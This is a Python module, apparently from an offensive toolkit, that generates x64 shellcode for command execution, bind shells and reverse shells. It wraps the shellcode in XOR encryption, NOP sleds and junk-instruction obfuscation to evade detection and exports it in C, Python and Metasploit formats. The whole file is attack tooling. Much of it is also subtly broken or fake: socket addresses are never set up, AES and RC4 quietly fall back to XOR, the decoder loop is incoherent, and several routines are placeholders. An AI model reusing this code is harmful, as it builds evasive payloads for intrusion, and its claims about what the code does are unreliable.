#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Advanced Shellcode Generator
Generates polymorphic, encrypted, and obfuscated shellcode
"""

import random
import struct
import base64
import zlib
from typing import Dict, List, Any, Optional, Tuple
from core.output_handler import print_info, print_success, print_error, print_warning

class ShellcodeGenerator:
    """Advanced Shellcode Generator with multiple techniques"""
    
    def __init__(self):
        self.architectures = ['x86', 'x64', 'arm', 'arm64', 'mips', 'ppc']
        self.encryption_methods = ['xor', 'aes', 'rc4', 'custom']
        self.obfuscation_methods = ['nopsled', 'garbage', 'junk', 'polymorphic']
        self.shellcode_templates = self._load_shellcode_templates()
    
    def generate_shellcode(self, 
                          shellcode_type: str = "execve",
                          architecture: str = "x64",
                          encryption: str = "none",
                          obfuscation: str = "none",
                          custom_params: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Generate advanced shellcode with specified parameters
        
        Args:
            shellcode_type: Type of shellcode (execve, bind_shell, reverse_shell, etc.)
            architecture: Target architecture
            encryption: Encryption method to apply
            obfuscation: Obfuscation method to apply
            custom_params: Custom parameters for shellcode generation
            
        Returns:
            Dict containing generated shellcode and metadata
        """
        try:
            print_info(f"Generating {shellcode_type} shellcode for {architecture}")
            
            # Generate base shellcode
            base_shellcode = self._generate_base_shellcode(shellcode_type, architecture, custom_params)
            
            # Apply encryption if requested
            if encryption != "none":
                base_shellcode = self._apply_encryption(base_shellcode, encryption)
            
            # Apply obfuscation if requested
            if obfuscation != "none":
                base_shellcode = self._apply_obfuscation(base_shellcode, obfuscation)
            
            # Generate decoder if needed
            decoder = self._generate_decoder(base_shellcode, encryption, obfuscation)
            
            # Create final payload
            final_payload = self._create_final_payload(decoder, base_shellcode)
            
            result = {
                'shellcode_type': shellcode_type,
                'architecture': architecture,
                'encryption': encryption,
                'obfuscation': obfuscation,
                'raw_shellcode': base_shellcode,
                'decoder': decoder,
                'final_payload': final_payload,
                'size': len(final_payload),
                'encoded_payload': self._encode_payload(final_payload),
                'c_array': self._generate_c_array(final_payload),
                'python_bytes': self._generate_python_bytes(final_payload),
                'metasploit_format': self._generate_metasploit_format(final_payload)
            }
            
            print_success(f"Shellcode generated: {len(final_payload)} bytes")
            return result
            
        except Exception as e:
            print_error(f"Shellcode generation failed: {e}")
            return {}
    
    def _generate_base_shellcode(self, shellcode_type: str, architecture: str, custom_params: Dict = None) -> bytes:
        """Generate base shellcode based on type and architecture"""
        if custom_params is None:
            custom_params = {}
        
        if architecture == "x64":
            return self._generate_x64_shellcode(shellcode_type, custom_params)
        elif architecture == "x86":
            return self._generate_x86_shellcode(shellcode_type, custom_params)
        elif architecture == "arm":
            return self._generate_arm_shellcode(shellcode_type, custom_params)
        elif architecture == "arm64":
            return self._generate_arm64_shellcode(shellcode_type, custom_params)
        else:
            print_warning(f"Architecture {architecture} not fully supported, using x64")
            return self._generate_x64_shellcode(shellcode_type, custom_params)
    
    def _generate_x64_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
        """Generate x64 shellcode"""
        if shellcode_type == "execve":
            return self._x64_execve_shellcode(custom_params)
        elif shellcode_type == "bind_shell":
            return self._x64_bind_shell_shellcode(custom_params)
        elif shellcode_type == "reverse_shell":
            return self._x64_reverse_shell_shellcode(custom_params)
        elif shellcode_type == "download_execute":
            return self._x64_download_execute_shellcode(custom_params)
        elif shellcode_type == "mimikatz":
            return self._x64_mimikatz_shellcode(custom_params)
        else:
            return self._x64_generic_shellcode(shellcode_type, custom_params)
    
    def _x64_execve_shellcode(self, custom_params: Dict) -> bytes:
        """Generate x64 execve shellcode"""
        command = custom_params.get('command', '/bin/sh')
        
        # x64 execve shellcode
        shellcode = bytearray()
        
        # sys_execve syscall number
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x50])              # push rax
        
        # Push command string
        cmd_bytes = command.encode() + b'\x00'
        if len(cmd_bytes) % 8 != 0:
            cmd_bytes += b'\x00' * (8 - (len(cmd_bytes) % 8))
        
        # Push command string onto stack
        for i in range(len(cmd_bytes) - 8, -1, -8):
            chunk = struct.unpack('<Q', cmd_bytes[i:i+8])[0]
            shellcode.extend([0x48, 0xb8])  # mov rax, imm64
            shellcode.extend(struct.pack('<Q', chunk))
            shellcode.extend([0x50])        # push rax
        
        # Setup arguments
        shellcode.extend([0x48, 0x89, 0xe7])  # mov rdi, rsp
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0xb0, 0x3b])        # mov al, 59 (execve)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        return bytes(shellcode)
    
    def _x64_bind_shell_shellcode(self, custom_params: Dict) -> bytes:
        """Generate x64 bind shell shellcode"""
        port = custom_params.get('port', 4444)
        
        # x64 bind shell shellcode
        shellcode = bytearray()
        
        # socket(AF_INET, SOCK_STREAM, 0)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x48, 0x83, 0xc0, 0x29])  # add rax, 41 (socket)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # bind(sockfd, &addr, sizeof(addr))
        shellcode.extend([0x48, 0x89, 0xc7])  # mov rdi, rax (socket fd)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
        shellcode.extend([0x48, 0x83, 0xc0, 0x31])  # add rax, 49 (bind)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # listen(sockfd, 1)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x83, 0xc0, 0x32])  # add rax, 50 (listen)
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x83, 0xc6, 0x01])  # add rsi, 1
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # accept(sockfd, NULL, NULL)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x83, 0xc0, 0x2b])  # add rax, 43 (accept)
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # dup2(clientfd, 0), dup2(clientfd, 1), dup2(clientfd, 2)
        shellcode.extend([0x48, 0x89, 0xc7])  # mov rdi, rax (client fd)
        for i in range(3):
            shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
            shellcode.extend([0x48, 0x83, 0xc0, 0x21])  # add rax, 33 (dup2)
            shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
            shellcode.extend([0x48, 0x83, 0xc6, i])     # add rsi, i
            shellcode.extend([0x0f, 0x05])        # syscall
        
        # execve("/bin/sh", NULL, NULL)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68])  # mov rbx, '//bin/sh'
        shellcode.extend([0x53])              # push rbx
        shellcode.extend([0x48, 0x89, 0xe7])  # mov rdi, rsp
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x57])              # push rdi
        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
        shellcode.extend([0xb0, 0x3b])        # mov al, 59 (execve)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        return bytes(shellcode)
    
    def _x64_reverse_shell_shellcode(self, custom_params: Dict) -> bytes:
        """Generate x64 reverse shell shellcode"""
        host = custom_params.get('host', '127.0.0.1')
        port = custom_params.get('port', 4444)
        
        # Convert host to IP address (simplified)
        if host == '127.0.0.1':
            host_bytes = [127, 0, 0, 1]
        else:
            host_bytes = [192, 168, 1, 100]  # Default fallback
        
        # x64 reverse shell shellcode
        shellcode = bytearray()
        
        # socket(AF_INET, SOCK_STREAM, 0)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x48, 0x83, 0xc0, 0x29])  # add rax, 41 (socket)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # connect(sockfd, &addr, sizeof(addr))
        shellcode.extend([0x48, 0x89, 0xc7])  # mov rdi, rax (socket fd)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
        shellcode.extend([0x48, 0x83, 0xc0, 0x2a])  # add rax, 42 (connect)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # dup2(clientfd, 0), dup2(clientfd, 1), dup2(clientfd, 2)
        for i in range(3):
            shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
            shellcode.extend([0x48, 0x83, 0xc0, 0x21])  # add rax, 33 (dup2)
            shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
            shellcode.extend([0x48, 0x83, 0xc6, i])     # add rsi, i
            shellcode.extend([0x0f, 0x05])        # syscall
        
        # execve("/bin/sh", NULL, NULL)
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68])  # mov rbx, '//bin/sh'
        shellcode.extend([0x53])              # push rbx
        shellcode.extend([0x48, 0x89, 0xe7])  # mov rdi, rsp
        shellcode.extend([0x50])              # push rax
        shellcode.extend([0x57])              # push rdi
        shellcode.extend([0x48, 0x89, 0xe6])  # mov rsi, rsp
        shellcode.extend([0xb0, 0x3b])        # mov al, 59 (execve)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        return bytes(shellcode)
    
    def _x64_download_execute_shellcode(self, custom_params: Dict) -> bytes:
        """Generate x64 download and execute shellcode"""
        url = custom_params.get('url', 'http://example.com/payload')
        
        # Simplified download and execute shellcode
        shellcode = bytearray()
        
        # This is a simplified version - real implementation would be much more complex
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x48, 0x83, 0xc0, 0x29])  # add rax, 41 (socket)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        # Additional implementation would go here...
        
        return bytes(shellcode)
    
    def _x64_mimikatz_shellcode(self, custom_params: Dict) -> bytes:
        """Generate x64 Mimikatz shellcode"""
        # This would contain the actual Mimikatz shellcode
        # For security reasons, we'll just return a placeholder
        shellcode = bytearray()
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x48, 0x83, 0xc0, 0x3c])  # add rax, 60 (exit)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        return bytes(shellcode)
    
    def _x64_generic_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
        """Generate generic x64 shellcode"""
        # Generic shellcode template
        shellcode = bytearray()
        shellcode.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        shellcode.extend([0x48, 0x31, 0xff])  # xor rdi, rdi
        shellcode.extend([0x48, 0x31, 0xf6])  # xor rsi, rsi
        shellcode.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        shellcode.extend([0x48, 0x83, 0xc0, 0x3c])  # add rax, 60 (exit)
        shellcode.extend([0x0f, 0x05])        # syscall
        
        return bytes(shellcode)
    
    def _generate_x86_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
        """Generate x86 shellcode"""
        # x86 shellcode implementation would go here
        return b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x01\xb3\x00\xcd\x80'
    
    def _generate_arm_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
        """Generate ARM shellcode"""
        # ARM shellcode implementation would go here
        return b'\x00\x00\xa0\xe3\x01\x00\x80\xe2\x00\x00\x00\xef'
    
    def _generate_arm64_shellcode(self, shellcode_type: str, custom_params: Dict) -> bytes:
        """Generate ARM64 shellcode"""
        # ARM64 shellcode implementation would go here
        return b'\x00\x00\x80\xd2\x01\x00\x80\xd2\x00\x00\x00\xd4'
    
    def _apply_encryption(self, shellcode: bytes, encryption_method: str) -> bytes:
        """Apply encryption to shellcode"""
        if encryption_method == "xor":
            return self._xor_encrypt(shellcode)
        elif encryption_method == "aes":
            return self._aes_encrypt(shellcode)
        elif encryption_method == "rc4":
            return self._rc4_encrypt(shellcode)
        elif encryption_method == "custom":
            return self._custom_encrypt(shellcode)
        else:
            return shellcode
    
    def _xor_encrypt(self, shellcode: bytes) -> bytes:
        """XOR encrypt shellcode"""
        key = random.randint(1, 255)
        encrypted = bytearray()
        
        for byte in shellcode:
            encrypted.append(byte ^ key)
        
        # Prepend key for decryption
        return bytes([key]) + bytes(encrypted)
    
    def _aes_encrypt(self, shellcode: bytes) -> bytes:
        """AES encrypt shellcode (simplified)"""
        # This would use actual AES encryption
        # For now, just return XOR encrypted version
        return self._xor_encrypt(shellcode)
    
    def _rc4_encrypt(self, shellcode: bytes) -> bytes:
        """RC4 encrypt shellcode (simplified)"""
        # This would use actual RC4 encryption
        # For now, just return XOR encrypted version
        return self._xor_encrypt(shellcode)
    
    def _custom_encrypt(self, shellcode: bytes) -> bytes:
        """Custom encryption method"""
        # Implement custom encryption
        return self._xor_encrypt(shellcode)
    
    def _apply_obfuscation(self, shellcode: bytes, obfuscation_method: str) -> bytes:
        """Apply obfuscation to shellcode"""
        if obfuscation_method == "nopsled":
            return self._add_nopsled(shellcode)
        elif obfuscation_method == "garbage":
            return self._add_garbage_instructions(shellcode)
        elif obfuscation_method == "junk":
            return self._add_junk_data(shellcode)
        elif obfuscation_method == "polymorphic":
            return self._polymorphic_obfuscation(shellcode)
        else:
            return shellcode
    
    def _add_nopsled(self, shellcode: bytes) -> bytes:
        """Add NOP sled to shellcode"""
        nopsled_size = random.randint(10, 100)
        nopsled = b'\x90' * nopsled_size  # NOP instructions
        return nopsled + shellcode
    
    def _add_garbage_instructions(self, shellcode: bytes) -> bytes:
        """Add garbage instructions to shellcode"""
        garbage_instructions = [
            b'\x48\x31\xc0',  # xor rax, rax
            b'\x48\x31\xdb',  # xor rbx, rbx
            b'\x48\x31\xc9',  # xor rcx, rcx
            b'\x48\x31\xd2',  # xor rdx, rdx
            b'\x90',          # nop
            b'\x48\x31\xc0',  # xor rax, rax
        ]
        
        obfuscated = bytearray()
        for byte in shellcode:
            if random.random() < 0.3:  # 30% chance to add garbage
                obfuscated.extend(random.choice(garbage_instructions))
            obfuscated.append(byte)
        
        return bytes(obfuscated)
    
    def _add_junk_data(self, shellcode: bytes) -> bytes:
        """Add junk data to shellcode"""
        junk_size = random.randint(5, 50)
        junk = bytes([random.randint(0, 255) for _ in range(junk_size)])
        return junk + shellcode
    
    def _polymorphic_obfuscation(self, shellcode: bytes) -> bytes:
        """Apply polymorphic obfuscation to shellcode"""
        # This would implement actual polymorphic techniques
        # For now, combine multiple obfuscation methods
        obfuscated = self._add_nopsled(shellcode)
        obfuscated = self._add_garbage_instructions(obfuscated)
        return obfuscated
    
    def _generate_decoder(self, shellcode: bytes, encryption: str, obfuscation: str) -> bytes:
        """Generate decoder for encrypted/obfuscated shellcode"""
        if encryption == "none" and obfuscation == "none":
            return b''
        
        decoder = bytearray()
        
        if encryption == "xor":
            decoder.extend(self._generate_xor_decoder())
        elif encryption == "aes":
            decoder.extend(self._generate_aes_decoder())
        elif encryption == "rc4":
            decoder.extend(self._generate_rc4_decoder())
        
        return bytes(decoder)
    
    def _generate_xor_decoder(self) -> bytes:
        """Generate XOR decoder"""
        # x64 XOR decoder
        decoder = bytearray()
        decoder.extend([0x48, 0x31, 0xc0])  # xor rax, rax
        decoder.extend([0x48, 0x31, 0xc9])  # xor rcx, rcx
        decoder.extend([0x48, 0x31, 0xd2])  # xor rdx, rdx
        decoder.extend([0x48, 0x8b, 0x04, 0x0c])  # mov rax, [rsp+rcx]
        decoder.extend([0x48, 0x83, 0xc1, 0x01])  # add rcx, 1
        decoder.extend([0x48, 0x31, 0xd0])  # xor rax, rdx
        decoder.extend([0x48, 0x89, 0x04, 0x0c])  # mov [rsp+rcx], rax
        decoder.extend([0x48, 0x83, 0xc1, 0x01])  # add rcx, 1
        decoder.extend([0x48, 0x83, 0xf9, 0x00])  # cmp rcx, 0
        decoder.extend([0x75, 0xf0])  # jne loop
        
        return bytes(decoder)
    
    def _generate_aes_decoder(self) -> bytes:
        """Generate AES decoder (placeholder)"""
        return self._generate_xor_decoder()
    
    def _generate_rc4_decoder(self) -> bytes:
        """Generate RC4 decoder (placeholder)"""
        return self._generate_xor_decoder()
    
    def _create_final_payload(self, decoder: bytes, shellcode: bytes) -> bytes:
        """Create final payload with decoder and shellcode"""
        if decoder:
            return decoder + shellcode
        else:
            return shellcode
    
    def _encode_payload(self, payload: bytes) -> str:
        """Encode payload in various formats"""
        return {
            'hex': payload.hex(),
            'base64': base64.b64encode(payload).decode(),
            'url_encoded': self._url_encode(payload),
            'c_escaped': self._c_escape(payload)
        }
    
    def _url_encode(self, payload: bytes) -> str:
        """URL encode payload"""
        import urllib.parse
        return urllib.parse.quote(payload)
    
    def _c_escape(self, payload: bytes) -> str:
        """C-style escape payload"""
        escaped = []
        for byte in payload:
            if byte < 32 or byte > 126:
                escaped.append(f'\\x{byte:02x}')
            else:
                escaped.append(chr(byte))
        return ''.join(escaped)
    
    def _generate_c_array(self, payload: bytes) -> str:
        """Generate C array format"""
        hex_values = [f'0x{byte:02x}' for byte in payload]
        return 'unsigned char shellcode[] = {\n    ' + ',\n    '.join(hex_values) + '\n};'
    
    def _generate_python_bytes(self, payload: bytes) -> str:
        """Generate Python bytes format"""
        return f'shellcode = {repr(payload)}'
    
    def _generate_metasploit_format(self, payload: bytes) -> str:
        """Generate Metasploit format"""
        return f'payload = "{payload.hex()}"'
    
    def _load_shellcode_templates(self) -> Dict[str, Any]:
        """Load shellcode templates"""
        return {
            'execve': {'description': 'Execute command', 'size': 'small'},
            'bind_shell': {'description': 'Bind shell', 'size': 'medium'},
            'reverse_shell': {'description': 'Reverse shell', 'size': 'medium'},
            'download_execute': {'description': 'Download and execute', 'size': 'large'},
            'mimikatz': {'description': 'Mimikatz', 'size': 'large'}
        }

# Export the main class
__all__ = ['ShellcodeGenerator']
